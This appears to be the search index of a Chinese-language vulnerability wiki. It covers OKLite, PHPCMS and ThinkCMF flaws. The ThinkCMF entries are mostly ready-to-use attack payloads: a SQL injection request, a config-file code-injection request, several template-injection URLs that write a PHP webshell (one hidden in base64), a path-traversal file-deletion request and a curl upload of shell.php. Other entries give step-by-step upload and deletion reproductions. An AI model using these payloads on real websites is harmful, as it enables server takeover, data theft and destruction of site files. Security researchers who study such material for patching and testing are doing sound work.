\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff08\u9700\u8981\u767b\u5f55\u540e\u53f0\uff09","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16131%20OKLite%20v1.2.25%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#_3","text":"\u76f4\u63a5\u4e0a\u4f20getshell","title":"\u6f0f\u6d1e\u5371\u5bb3"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16131%20OKLite%20v1.2.25%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#_4","text":"","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16131%20OKLite%20v1.2.25%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#_5","text":"OKLite","title":"\u4ea7\u54c1"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16131%20OKLite%20v1.2.25%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#_6","text":"OKLite v1.2.25 \u7248\u672c","title":"\u7248\u672c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16131%20OKLite%20v1.2.25%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#_7","text":"OKLite","title":"\u7ec4\u4ef6"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16131%20OKLite%20v1.2.25%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#_8","text":"\u767b\u5f55\u540e\u53f0\uff0c\u70b9\u51fb\u6a21\u5757\u7ba1\u7406 \u7f16\u8f91\u4e00\u4e2a\u6d4b\u8bd5\u6587\u4ef6test.php,\u538b\u7f29\u4e3atest.zip\u4e0a\u4f20\u3002 \u7136\u540e\u5bfc\u5165\u6a21\u5757 \u70b9\u51fb\u5f00\u59cb\u4e0a\u4f20\uff0c\u4e0a\u4f20shell\u751f\u6210\u5728\u89e3\u538b\u4e3b\u76ee\u5f55\u4e0b\u9762 \u8bbf\u95ee http://127.0.0.1:8888/1.2.25/data/cache/test.php","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16132%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/","text":"\u524d\u8a00 \u00b6 OKLite v1.2.25 \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e \u6f0f\u6d1e\u7b80\u4ecb \u00b6 Ethan\u53d1\u73b0OKLite v1.2.25 \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e\uff08\u9700\u8981\u767b\u5f55\u540e\u53f0\uff09 \u6f0f\u6d1e\u5371\u5bb3 \u00b6 \u540e\u53f0\u5220\u9664\u6587\u4ef6\u65f6\u6293\u5305\u4fee\u6539 title \u53c2\u6570\u53ef\u4ee5\u76f4\u63a5\u5220\u9664\u7f51\u7ad9\u4efb\u610f\u6587\u4ef6 \u5f71\u54cd\u8303\u56f4 \u00b6 \u4ea7\u54c1 \u00b6 OKLite \u7248\u672c \u00b6 OKLite v1.2.25 \u7248\u672c \u7ec4\u4ef6 \u00b6 OKLite \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u5728\u4e3b\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2aindex.txt\u7528\u6765\u6d4b\u8bd5 \u767b\u5f55\u540e\u53f0\uff0c\u5728\u8bbe\u7f6e->\u98ce\u683c\u7ba1\u7406 \u70b9\u51fb\u6587\u4ef6\u7ba1\u7406 \u968f\u4fbf\u5220\u9664\u4e00\u4e2a\u6587\u4ef6\uff0c\u70b9\u51fb\u6293\u5305\uff0c\u4fee\u6539title\u53c2\u6570\u4e3a../../test.txt \u53d1\u9001\u8bf7\u6c42\uff0c\u4e3b\u76ee\u5f55\u4e0b\u7684test.txt\u5df2\u88ab\u5220\u9664","title":"CVE 2019 16132 OKLite v1.2.25 \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16132%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#_1","text":"OKLite v1.2.25 \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e","title":"\u524d\u8a00"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16132%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#_2","text":"Ethan\u53d1\u73b0OKLite v1.2.25 \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e\uff08\u9700\u8981\u767b\u5f55\u540e\u53f0\uff09","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16132%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#_3","text":"\u540e\u53f0\u5220\u9664\u6587\u4ef6\u65f6\u6293\u5305\u4fee\u6539 title \u53c2\u6570\u53ef\u4ee5\u76f4\u63a5\u5220\u9664\u7f51\u7ad9\u4efb\u610f\u6587\u4ef6","title":"\u6f0f\u6d1e\u5371\u5bb3"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16132%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#_4","text":"","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16132%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#_5","text":"OKLite","title":"\u4ea7\u54c1"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16132%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#_6","text":"OKLite v1.2.25 \u7248\u672c","title":"\u7248\u672c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16132%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#_7","text":"OKLite","title":"\u7ec4\u4ef6"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16132%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#_8","text":"\u5728\u4e3b\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2aindex.txt\u7528\u6765\u6d4b\u8bd5 \u767b\u5f55\u540e\u53f0\uff0c\u5728\u8bbe\u7f6e->\u98ce\u683c\u7ba1\u7406 \u70b9\u51fb\u6587\u4ef6\u7ba1\u7406 \u968f\u4fbf\u5220\u9664\u4e00\u4e2a\u6587\u4ef6\uff0c\u70b9\u51fb\u6293\u5305\uff0c\u4fee\u6539title\u53c2\u6570\u4e3a../../test.txt \u53d1\u9001\u8bf7\u6c42\uff0c\u4e3b\u76ee\u5f55\u4e0b\u7684test.txt\u5df2\u88ab\u5220\u9664","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_SQL%E6%B3%A8%E5%85%A5/","text":"PHPCMS_v9.6.0_SQL\u6ce8\u5165 \u00b6 Official \u00b6 http://bbs.phpcms.cn/thread-936226-1-1.html Affected Version \u00b6 PHPCMS v9.6.0 github\u83b7\u53d6\u811a\u672c PoC \u00b6 References \u00b6 https://zhuanlan.zhihu.com/p/26263513","title":"PHPCMS_v9.6.0_SQL\u6ce8\u5165"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_SQL%E6%B3%A8%E5%85%A5/#phpcms_v960_sql","text":"","title":"PHPCMS_v9.6.0_SQL\u6ce8\u5165"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_SQL%E6%B3%A8%E5%85%A5/#official","text":"http://bbs.phpcms.cn/thread-936226-1-1.html","title":"Official"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_SQL%E6%B3%A8%E5%85%A5/#affected-version","text":"PHPCMS v9.6.0 github\u83b7\u53d6\u811a\u672c","title":"Affected Version"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_SQL%E6%B3%A8%E5%85%A5/#poc","text":"","title":"PoC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_SQL%E6%B3%A8%E5%85%A5/#references","text":"https://zhuanlan.zhihu.com/p/26263513","title":"References"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","text":"PHPCMS_v9.6.0_\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 \u00b6 Official \u00b6 http://bbs.phpcms.cn/thread-936226-1-1.html Affected Version \u00b6 PHPCMS v9.6.0 github\u83b7\u53d6\u811a\u672c PoC \u00b6 \u6ce8\u610f\uff1a \u6bcf\u6b21\u6d4b\u8bd5\u540e\u90fd\u9700\u8981\u628a poc.py \u4e2d post data \u7684 username \u548c email \u4fee\u6539\u4e00\u904d\u3002 \u4f7f\u7528\u83dc\u5200\u8fde\u63a5\uff1a References \u00b6 http://www.evilclay.com/2017/05/10/PHPCMSv9-6-0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u5206\u6790/","title":"PHPCMS_v9.6.0_\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#phpcms_v960_","text":"","title":"PHPCMS_v9.6.0_\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#official","text":"http://bbs.phpcms.cn/thread-936226-1-1.html","title":"Official"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#affected-version","text":"PHPCMS v9.6.0 github\u83b7\u53d6\u811a\u672c","title":"Affected Version"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#poc","text":"\u6ce8\u610f\uff1a \u6bcf\u6b21\u6d4b\u8bd5\u540e\u90fd\u9700\u8981\u628a poc.py \u4e2d post data \u7684 username \u548c email \u4fee\u6539\u4e00\u904d\u3002 \u4f7f\u7528\u83dc\u5200\u8fde\u63a5\uff1a","title":"PoC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#references","text":"http://www.evilclay.com/2017/05/10/PHPCMSv9-6-0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u5206\u6790/","title":"References"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.1_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/","text":"PHPCMS_v9.6.1_\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d \u00b6 Affected Version \u00b6 PHPCMS v9.6.1 PoC \u00b6 \u6ce8\u610f\uff1a \u82e5\u672c\u5730\u6d4b\u8bd5 PoC \u6267\u884c\u5931\u8d25\u53ef\u4ee5\u901a\u8fc7\u8be5\u6307\u5b9a hosts\u6587\u4ef6 localhost \u4e3a 127.0.0.1 \u89e3\u51b3\u3002 References \u00b6 http://bobao.360.cn/learning/detail/3805.html?m=wap&c=index&a=init&siteid=1 https://www.seebug.org/vuldb/ssvid-92959","title":"PHPCMS_v9.6.1_\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.1_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#phpcms_v961_","text":"","title":"PHPCMS_v9.6.1_\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.1_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#affected-version","text":"PHPCMS v9.6.1","title":"Affected Version"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.1_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#poc","text":"\u6ce8\u610f\uff1a \u82e5\u672c\u5730\u6d4b\u8bd5 PoC \u6267\u884c\u5931\u8d25\u53ef\u4ee5\u901a\u8fc7\u8be5\u6307\u5b9a hosts\u6587\u4ef6 localhost \u4e3a 127.0.0.1 \u89e3\u51b3\u3002","title":"PoC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.1_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#references","text":"http://bobao.360.cn/learning/detail/3805.html?m=wap&c=index&a=init&siteid=1 https://www.seebug.org/vuldb/ssvid-92959","title":"References"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.2_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/","text":"PHPCMS_v9.6.2_\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d \u00b6 Affected Version \u00b6 PHPCMS v9.6.1 PHPCMS v9.6.2 PoC \u00b6 \u590d\u73b0\u7684\u65f6\u5019\u9700\u8981\u6ce8\u610f\u4e24\u70b9\uff1a \u65b0\u5b89\u88c5\u7684 PHPCMS_v9.6.2 \u76ee\u5f55 \\PHPCMS_v9.6.2\\caches\\caches_commons\\caches_data \u7f3a\u5c11\u7f13\u5b58\u6a21\u578b\u6587\u4ef6 model.cache.php \u53ef\u4ee5\u901a\u8fc7\u590d\u5236 PHPCMS_v9.6.1 \u54cd\u5e94\u76ee\u5f55\u7684\u6587\u4ef6\u5f97\u5230\u3002 \u901a\u8fc7 xxx.php/ \u7684\u65b9\u5f0f\u7ed5\u8fc7\u6587\u4ef6\u540e\u7f00\u540d\u68c0\u6d4b\u9700\u8981\u5728 PHP \u7248\u672c\u4e3a 5.2.x \u65f6 \u624d\u53ef\u4ee5\u6210\u529f\u8bfb\u53d6\u6587\u4ef6\u3002 References \u00b6 http://www.lybbn.cn/data/datas.php?yw=176 https://www.seebug.org/vuldb/ssvid-93121","title":"PHPCMS_v9.6.2_\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.2_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#phpcms_v962_","text":"","title":"PHPCMS_v9.6.2_\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.2_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#affected-version","text":"PHPCMS v9.6.1 PHPCMS v9.6.2","title":"Affected Version"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.2_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#poc","text":"\u590d\u73b0\u7684\u65f6\u5019\u9700\u8981\u6ce8\u610f\u4e24\u70b9\uff1a \u65b0\u5b89\u88c5\u7684 PHPCMS_v9.6.2 \u76ee\u5f55 \\PHPCMS_v9.6.2\\caches\\caches_commons\\caches_data \u7f3a\u5c11\u7f13\u5b58\u6a21\u578b\u6587\u4ef6 model.cache.php \u53ef\u4ee5\u901a\u8fc7\u590d\u5236 PHPCMS_v9.6.1 \u54cd\u5e94\u76ee\u5f55\u7684\u6587\u4ef6\u5f97\u5230\u3002 \u901a\u8fc7 xxx.php/ \u7684\u65b9\u5f0f\u7ed5\u8fc7\u6587\u4ef6\u540e\u7f00\u540d\u68c0\u6d4b\u9700\u8981\u5728 PHP \u7248\u672c\u4e3a 5.2.x \u65f6 \u624d\u53ef\u4ee5\u6210\u529f\u8bfb\u53d6\u6587\u4ef6\u3002","title":"PoC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.2_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#references","text":"http://www.lybbn.cn/data/datas.php?yw=176 https://www.seebug.org/vuldb/ssvid-93121","title":"References"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/CVE-2019-7580%20thinkcmf-5.0.190111%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","text":"CVE-2019-7580 thinkcmf-5.0.190111\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u5199\u5165\u5bfc\u81f4\u7684\u4ee3\u7801\u6267\u884c \u00b6 0x00 \u73af\u5883\u642d\u5efa \u00b6 \u9996\u5148\u53bbthinkcmf\u4e0b\u8f7d5.0\u7684\u6700\u65b0\u7248 https://github.com/thinkcmf/thinkcmf/archive/5.0.190111.zip \u5207\u6362\u5230web\u6839\u76ee\u5f55\u4e0b\uff0c\u6bd4\u5982/var/www\uff0c\u7136\u540e\u65b0\u5efa\u4e00\u4e2a\u76ee\u5f55\uff1aThinkCMF-5.0.190111 \u628a\u9664public\u76ee\u5f55\u5916\u7684\u6587\u4ef6\u90fd\u79fb\u52a8\u5230ThinkCMF-5.0.190111\u4e0b\u3002\u7136\u540e\u4fee\u6539index.php\uff0c\u5c06\u5176\u4e2d\u7684 define('CMF_ROOT', __DIR__ . '/../'); \u4fee\u6539\u4e3a define('CMF_ROOT', __DIR__ . '/ThinkCMF-5.0.190111/'); \u7136\u540e\u4e00\u6b65\u6b65\u5b8c\u6210\u5b89\u88c5\u3002 \u53c2\u8003\uff1a https://blog.csdn.net/youaregoo/article/details/82219722 0x01 \u5229\u7528\u8fc7\u7a0b\uff1a \u00b6 \u540e\u53f0\u767b\u5f55\u72b6\u6001\u4e0b\uff0c 1\u3001\u5c06payload\u63d2\u5165\u6570\u636e\u5e93\u5e76\u8bfb\u53d6\u7136\u540e\u5199\u5165data/conf/route.php\u6587\u4ef6 POST /portal/admin_category/addpost.html parent_id=0&name=111&alias=a'=>array(%22%22)%2csleep(5)%2c'b 2\u3001\u7136\u540e\u8bbf\u95ee\uff1a /portal/admin_category/index.html \u89e6\u53d1 include data/conf/route.php \u64cd\u4f5c\uff0c\u6267\u884cpayload\u3002\u4e0b\u56fe\u4ee5\u6267\u884csleep(5)\u4f5c\u4e3a\u6f14\u793a\u3002 POC \u00b6 POST /portal/admin_category/addpost.html HTTP/1.1 Host: 192.168.170.209 Content-Length: 183 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Cookie: PHPSESSID=of2ar92rpeucrh4cg6s4t4dae6; admin_username=admin Connection: close parent_id=0&name=111&alias=1'%3D%3Earray(%22%22)%2Cphpinfo()%2C'2","title":"CVE 2019 7580 thinkcmf 5.0.190111\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u5199\u5165\u5bfc\u81f4\u7684\u4ee3\u7801\u6267\u884c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/CVE-2019-7580%20thinkcmf-5.0.190111%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#cve-2019-7580-thinkcmf-50190111","text":"","title":"CVE-2019-7580 thinkcmf-5.0.190111\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u5199\u5165\u5bfc\u81f4\u7684\u4ee3\u7801\u6267\u884c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/CVE-2019-7580%20thinkcmf-5.0.190111%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#0x00","text":"\u9996\u5148\u53bbthinkcmf\u4e0b\u8f7d5.0\u7684\u6700\u65b0\u7248 https://github.com/thinkcmf/thinkcmf/archive/5.0.190111.zip \u5207\u6362\u5230web\u6839\u76ee\u5f55\u4e0b\uff0c\u6bd4\u5982/var/www\uff0c\u7136\u540e\u65b0\u5efa\u4e00\u4e2a\u76ee\u5f55\uff1aThinkCMF-5.0.190111 \u628a\u9664public\u76ee\u5f55\u5916\u7684\u6587\u4ef6\u90fd\u79fb\u52a8\u5230ThinkCMF-5.0.190111\u4e0b\u3002\u7136\u540e\u4fee\u6539index.php\uff0c\u5c06\u5176\u4e2d\u7684 define('CMF_ROOT', __DIR__ . '/../'); \u4fee\u6539\u4e3a define('CMF_ROOT', __DIR__ . '/ThinkCMF-5.0.190111/'); \u7136\u540e\u4e00\u6b65\u6b65\u5b8c\u6210\u5b89\u88c5\u3002 \u53c2\u8003\uff1a https://blog.csdn.net/youaregoo/article/details/82219722","title":"0x00 \u73af\u5883\u642d\u5efa"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/CVE-2019-7580%20thinkcmf-5.0.190111%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#0x01","text":"\u540e\u53f0\u767b\u5f55\u72b6\u6001\u4e0b\uff0c 1\u3001\u5c06payload\u63d2\u5165\u6570\u636e\u5e93\u5e76\u8bfb\u53d6\u7136\u540e\u5199\u5165data/conf/route.php\u6587\u4ef6 POST /portal/admin_category/addpost.html parent_id=0&name=111&alias=a'=>array(%22%22)%2csleep(5)%2c'b 2\u3001\u7136\u540e\u8bbf\u95ee\uff1a /portal/admin_category/index.html \u89e6\u53d1 include data/conf/route.php \u64cd\u4f5c\uff0c\u6267\u884cpayload\u3002\u4e0b\u56fe\u4ee5\u6267\u884csleep(5)\u4f5c\u4e3a\u6f14\u793a\u3002","title":"0x01 \u5229\u7528\u8fc7\u7a0b\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/CVE-2019-7580%20thinkcmf-5.0.190111%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#poc","text":"POST /portal/admin_category/addpost.html HTTP/1.1 Host: 192.168.170.209 Content-Length: 183 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Cookie: PHPSESSID=of2ar92rpeucrh4cg6s4t4dae6; admin_username=admin Connection: close parent_id=0&name=111&alias=1'%3D%3Earray(%22%22)%2Cphpinfo()%2C'2","title":"POC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/ThinkCMF%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9B%86%E5%92%8C/","text":"ThinkCMF\u6f0f\u6d1e\u5168\u96c6\u548c \u00b6 ...\u6301\u7eed\u6536\u96c6,\u6b22\u8fce\u8d21\u732e \u524d\u53f0SQL\u6ce8\u5165: \u9700\u8981\u666e\u901a\u7528\u6237\u6743\u9650\uff0c\u9ed8\u8ba4\u53ef\u6ce8\u518c paylaod: POST /ThinkCMFX/index.php?g=portal&m=article&a=edit_post HTTP/1.1 Host: localhost Connection: close Cookie: PHPSESSID=kcg5v82ms3v13o8pgrhh9saj95 Content-Type: application/x-www-form-urlencoded Content-Length: 79 post[id][0]=bind&post[id][1]=0 and updatexml(1, concat(0x7e,user(),0x7e),1)--+- \u8fd8\u6709\u4ee5\u4e0b\u53ef\u4ee5\u6d4b\u8bd5\uff1a post: term:123 post[post_title]:123 post[post_title]:aaa post_title:123 post[id][0]:bind \u524d\u53f0\u6a21\u7248\u6ce8\u5165\u6f0f\u6d1e-\u53efgetshell\u56db\u5904 ```raw \u4ec5\u5728Windows\u73af\u5883\u6d4b\u8bd5 \u00b6 \u7b2c\u4e00\u5904 \u00b6 http://website/ThinkCMFX/index.php?g=Comment&m=Widget&a=fetch&templateFile=/../public/index&content= <%3fphp+file_put_contents('m.php','<%3fphp+eval($ POST[ ])%3b');?>&prefix= \u7b2c\u4e8c\u5904 \u00b6 http://website/ThinkCMFX/index.php?g=Api&m=Plugin&a=fetch&templateFile=/../../../public/index&content= <%3fphp+file_put_contents('m.php','<%3fphp+eval($ POST[ ])%3b');?>&prefix= \u7b2c\u4e09\u5904 \u00b6 /index.php?a=fetch&templateFile=public/index&prefix=''&content= file_put_contents('test.php','<?php phpinfo(); ?>') \u7b2c\u56db\u5904 \u00b6 /index.php?a=fetch&content=<?php+file_put_contents(\"mrxn.php\", base64_decode(\"PD9waHAgZXZhbCgkX1BPU1RbIjAwMCJdKTs/Pg==\")); ``` \u4efb\u610f\u6587\u4ef6\u5220\u9664-\u53ea\u80fdwindows\u5220\u9664 \u5728\u7528\u6237\u4e0a\u4f20\u5934\u50cf\u5904\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e\uff0c\u53d1\u9001\u5982\u4e0b\u6570\u636e\u5305\u540e\uff0c\u4f1a\u5220\u9664\u7f51\u7ad9\u6839\u76ee\u5f55\u4e0b\u4e00\u4e2a\u540d\u4e3a test.txt \u7684\u6587\u4ef6\u3002\uff08\u8be5\u6f0f\u6d1e\u4ec5\u80fd\u5728 Windows \u4e0b\u89e6\u53d1\uff09 POST /ThinkCMFX/index.php?g=User&m=Profile&a=do_avatar& HTTP/1.1 Host: localhost Cookie: PHPSESSID=bggit7phrb1dl99pcb2lagbmq0; Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 27 imgurl=..\\..\\..\\test.txt \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 \u5728 ThinkCMFX2.2.3 \u6700\u7ec8\u7248\u4e2d\uff0c\u5b58\u5728\u4e00\u5904\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\uff08\u9700\u8981\u666e\u901a\u7528\u6237\u6743\u9650\uff0c\u9ed8\u8ba4\u53ef\u6ce8\u518c\uff09 curl -F \"file=@/tmp/shell.php\" -X \"POST\" -b 'PHPSESSID=qekmttucmue6vv41kpdjghnkd0;' 'http://127.0.0.1/ThinkCMFX/index.php?g=Asset&m=Ueditor&a=upload&action=uploadfile' \u4efb\u610f\u6587\u4ef6\u5305\u542b\uff08\u8bfb\u53d6\u6570\u636e\u5e93\u914d\u7f6e\u7b49\u7b49\uff09 /index.php?a=display&templateFile=README.md \u4f7f\u7528\u8bf4\u660e \u00b6 